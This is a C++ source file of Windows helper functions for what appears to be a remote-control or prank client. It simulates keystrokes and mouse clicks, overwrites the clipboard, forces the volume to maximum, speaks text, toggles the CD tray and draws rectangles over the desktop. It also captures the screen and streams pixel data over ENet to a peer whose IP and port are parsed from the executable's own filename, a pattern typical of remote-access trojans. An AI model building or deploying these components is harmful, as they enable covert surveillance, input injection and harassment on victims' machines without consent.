#include "Functions.h"

void SimulateKey(WORD vkey, bool down) {
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wScan = MapVirtualKey(vkey, MAPVK_VK_TO_VSC);
	input.ki.time = 0;
	input.ki.dwExtraInfo = 0;
	input.ki.wVk = vkey;
	if (down)
		input.ki.dwFlags = 0;
	else
		input.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &input, sizeof(INPUT));
}

void PressKey(WORD vkey) {
	SimulateKey(vkey, true);
	Sleep(100);
	SimulateKey(vkey, false);
}

void SetClipboard(HWND hwnd, const std::string &s){
	OpenClipboard(hwnd);
	EmptyClipboard();
	HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, s.size() + 1);
	if (!hg){
		CloseClipboard();
		return;
	}
	memcpy(GlobalLock(hg), s.c_str(), s.size() + 1);
	GlobalUnlock(hg);
	SetClipboardData(CF_TEXT, hg);
	CloseClipboard();
	GlobalFree(hg);
}

void SimulateMouse(int button, bool down) {
	INPUT    Input = { 0 };

	Input.type = INPUT_MOUSE;
	if (button == 0) {
		if (down)
			Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
		else
			Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	}
	else {
		if (down)
			Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
		else
			Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	}
	SendInput(1, &Input, sizeof(INPUT));
}

void SendPacket(ENetPeer *peer, const char *arg, ...) {
	va_list arguments;
	string packet;

	for (va_start(arguments, arg); arg != ""; arg = va_arg(arguments, const char *)) {
		if (packet.size() > 0)
			packet += ",";
		packet += arg;
	}
	va_end(arguments);
	
	ENetPacket *p = enet_packet_create((char*)packet.c_str(), strlen(packet.c_str()) + 1, ENET_PACKET_FLAG_RELIABLE);
	enet_peer_send(peer, 0, p);
}

string GetUsername() {
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	GetUserName((TCHAR*)name, &size);
	return name;
}

vector<string> GetIpAndPort(string exe) {
	if (exe.find('~') == string::npos) {
		cout << "Can't find IP/Port" << endl;
		Sleep(3000);
		exit(EXIT_FAILURE);
	}

	vector<string> vars;

	exe = exe.substr(exe.find_last_of('\\') + 1, string::npos);

	string IP = exe.substr(exe.find_first_of('~') + 1, exe.find_last_of('~') - exe.find_first_of('~') - 1);
	string port = exe.substr(exe.find_last_of('~') + 1, exe.find_last_of('.') - exe.find_last_of('~') - 1);
	//IP = "10.210.18.43"; port = "12345";

	vars.push_back(IP);
	vars.push_back(port);

	return vars;
}

void DeactivateEffects(map<int, bool> &effects) {
	for (auto effect = effects.begin(); effect != effects.end(); effect++) {
		effect->second = false;
	}
}

bool ChangeVolume(double nVolume, bool bScalar)
{

	HRESULT hr = NULL;
	bool decibels = false;
	bool scalar = false;
	double newVolume = nVolume;

	CoInitialize(NULL);
	IMMDeviceEnumerator *deviceEnumerator = NULL;
	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
		__uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
	IMMDevice *defaultDevice = NULL;

	hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
	deviceEnumerator->Release();
	deviceEnumerator = NULL;

	IAudioEndpointVolume *endpointVolume = NULL;
	hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
		CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
	defaultDevice->Release();
	defaultDevice = NULL;

	// -------------------------
	float currentVolume = 0;
	endpointVolume->GetMasterVolumeLevel(&currentVolume);
	//printf("Current volume in dB is: %f\n", currentVolume);

	hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
	//CString strCur=L"";
	//strCur.Format(L"%f",currentVolume);
	//AfxMessageBox(strCur);

	// printf("Current volume as a scalar is: %f\n", currentVolume);
	if (bScalar == false)
	{
		hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
	}
	else if (bScalar == true)
	{
		hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
	}
	endpointVolume->Release();

	CoUninitialize();

	return FALSE;
}

void VolumeUp() {
	INPUT ip = { 0 };
	ip.type = INPUT_KEYBOARD;
	ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
	SendInput(1, &ip, sizeof(INPUT));
	ip.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &ip, sizeof(INPUT));
	ChangeVolume(1, true);
}

wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

void talk(string sentenceString) {
	std::wstring stemp = s2ws(sentenceString);
	LPCWSTR sentence = stemp.c_str();

	ISpVoice * pVoice = NULL;

	::CoInitialize(NULL);

	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
	if (SUCCEEDED(hr))
	{
		hr = pVoice->Speak(sentence, SPF_IS_XML, NULL);
		pVoice->Release();
		pVoice = NULL;
	}

	::CoUninitialize();
}

void FindSounds(vector<string> &sounds) {
	char search_path[200];
	sprintf_s(search_path, "%s*.*", "C:/windows/media/");
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path, &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// read all (real) files in current folder, delete '!' read other 2 default folder . and ..
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				string file = "C:/windows/media/" + string(fd.cFileName);
				sounds.push_back(file);
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
}

void OpenCloseDrive() {
	mciSendString("open cdaudio", 0, 0, 0);
	mciSendString("set CDAudio door open", NULL, 0, NULL);
	Sleep(500 + rand() % 1000);
	mciSendString("set CDAudio door closed", NULL, 0, NULL);
}

void WhiteRectangles(int screenWidth, int screenHeight) {
	HDC dc;
	dc = GetDC(NULL);
	for (int i = 0; i < 10; i++) {
		Rectangle(dc, rand() % screenWidth, rand() % screenHeight, rand() % screenWidth, rand() % screenHeight);
	}
	ReleaseDC(NULL, dc);
}

void ScreenShot(char*BmpName)
{
	HWND DesktopHwnd = GetDesktopWindow();
	RECT DesktopParams;
	HDC DevC = GetDC(DesktopHwnd);
	GetWindowRect(DesktopHwnd, &DesktopParams);
	DWORD Width = DesktopParams.right - DesktopParams.left;
	DWORD Height = DesktopParams.bottom - DesktopParams.top;

	DWORD FileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (Width*Height * 4));
	char *BmpFileData = (char*)GlobalAlloc(0x0040, FileSize);

	PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER)BmpFileData;
	PBITMAPINFOHEADER  BInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];

	BFileHeader->bfType = 0x4D42; // BM
	BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
	BFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	BInfoHeader->biPlanes = 1;
	BInfoHeader->biBitCount = 24;
	BInfoHeader->biCompression = BI_RGB;
	BInfoHeader->biHeight = Height;
	BInfoHeader->biWidth = Width;

	RGBTRIPLE *Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];

	HDC CaptureDC = CreateCompatibleDC(DevC);
	HBITMAP CaptureBitmap = CreateCompatibleBitmap(DevC, Width, Height);
	SelectObject(CaptureDC, CaptureBitmap);
	BitBlt(CaptureDC, 0, 0, Width, Height, DevC, 0, 0, SRCCOPY | CAPTUREBLT);
	GetDIBits(CaptureDC, CaptureBitmap, 0, Height, Image, (LPBITMAPINFO)BInfoHeader, DIB_RGB_COLORS);

	DWORD Junk;
	HANDLE FH = CreateFileA(BmpName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	WriteFile(FH, BmpFileData, FileSize, &Junk, 0);
	CloseHandle(FH);
	GlobalFree(BmpFileData);
}

void SendScreenData(vector<Pixel> &screenData, ENetPeer *peer) {
	int packetAmount = 6;
	int amount = 200;
	for (int j = 0; j < packetAmount; j++) {
		string packet = "ScreenData,";
		for (int i = 0; i < amount; i++) {
			if (i < screenData.size())
				packet += to_string(screenData[i].x) + "," + to_string(screenData[i].y) + "," + to_string(screenData[i].color.r) + "," + to_string(screenData[i].color.g) + "," + to_string(screenData[i].color.b) + ",";
			else
				break;
		}
		if (amount < screenData.size())
			screenData.erase(screenData.begin(), screenData.begin() + amount);
		else
			screenData.clear();
		SendPacket(peer, packet.c_str(), "");
	}
}